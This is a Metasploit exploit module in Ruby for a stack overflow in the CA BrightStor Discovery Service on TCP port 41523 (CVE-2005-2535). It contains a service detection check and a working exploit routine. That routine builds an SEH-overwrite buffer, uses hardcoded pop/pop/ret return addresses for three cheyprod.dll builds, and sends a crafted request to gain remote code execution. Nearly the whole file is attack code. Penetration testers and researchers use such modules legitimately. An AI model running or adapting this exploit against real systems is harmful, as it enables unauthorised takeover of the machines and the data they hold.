##
# $Id: discovery_tcp.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor Discovery Service TCP Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the CA BrightStor
				Discovery Service. This vulnerability occurs when a specific
				type of request is sent to the TCP listener on port 41523.
				This vulnerability was discovered by cybertronic[at]gmx.net
				and affects all known versions of the BrightStor product.
				This module is based on the 'cabrightstor_disco' exploit by
				Thor Doomen.
			},
			'Author'         => [ 'hdm', 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2005-2535'],
					[ 'OSVDB', '13814'],
					[ 'BID', '12536'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2005-02/0123.html'],
					[ 'URL', 'http://milw0rm.com/exploits/1131'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'cheyprod.dll 9/14/2000', # Build 1220.0 9/14/2000 7.0.1220.0
						{
							'Platform' => 'win',
							'Ret'      => 0x23803b20, # pop/pop/ret
							'Offset'   => 1032,
						},
					],
					[
						'cheyprod.dll 12/12/2003',
						{
							'Platform' => 'win',
							'Ret'      => 0x23805714, # pop/pop/ret
							'Offset'   => 1024,
						},
					],
					[
						'cheyprod.dll 07/21/2004',
						{
							'Platform' => 'win',
							'Ret'      => 0x23805d10, # pop/pop/ret
							'Offset'   => 1024,
						},
					],
				],
			'DisclosureDate' => 'Feb 14 2005',
			'DefaultTarget' => 1))

		register_options(
			[
				Opt::RPORT(41523)
			], self.class)
	end

	def check

		# The first request should have no reply
		csock = Rex::Socket::Tcp.create(
			'PeerHost'  => datastore['RHOST'],
			'PeerPort'  => datastore['RPORT'],
			'Context'   =>
				{
					'Msf'        => framework,
					'MsfExploit' => self,
				})

		csock.put('META')
		x = csock.get_once(-1, 3)
		csock.close

		# The second request should be replied with the host name
		csock = Rex::Socket::Tcp.create(
			'PeerHost'  => datastore['RHOST'],
			'PeerPort'  => datastore['RPORT'],
			'Context'   =>
				{
					'Msf'        => framework,
					'MsfExploit' => self,
				})

		csock.put('hMETA')
		y = csock.get_once(-1, 3)
		csock.close

		if (y and not x)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		buf = rand_text_english(4096)

		# Overwriting the return address works well, but the only register
		# pointing back to our code is 'esp'. The following stub overwrites
		# the SEH frame instead, making things a bit easier.

		seh = generate_seh_payload(target.ret)
		buf[target['Offset'], seh.length] = seh

		# Make sure the return address is invalid to trigger SEH
		buf[ 900, 100]     = (rand(127)+128).chr * 100

		# SERVICEPC is the client host name actually =P (thanks Juliano!)
		req = "\x9b" + 'SERVICEPC' + "\x18" + [0x01020304].pack('N') + 'SERVICEPC' + "\x01\x0c\x6c\x93\xce\x18\x18\x41"
		req << buf

		sock.put(req)
		sock.get_once

		handler
		disconnect
	end

end
